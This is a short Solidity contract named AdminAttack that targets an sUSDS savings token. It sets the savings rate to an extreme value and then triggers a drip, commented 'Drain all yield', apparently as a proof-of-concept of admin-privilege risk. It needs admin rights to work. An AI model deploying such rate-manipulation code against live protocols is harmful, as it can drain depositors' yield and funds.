
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ISUSDS {
    function file(bytes32 what, uint256 data) external;
    function drip() external returns (uint256);
    function wards(address) external view returns (uint256);
}

contract AdminAttack {
    ISUSDS public sUSDS;
    
    constructor(address _sUSDS) {
        sUSDS = ISUSDS(_sUSDS);
    }
    
    // Only works if caller is admin
    function attack() external {
        // Set SSR to extreme value
        sUSDS.file("ssr", 1000000 * 1e27);
        
        // Drain all yield
        sUSDS.drip();
    }
}
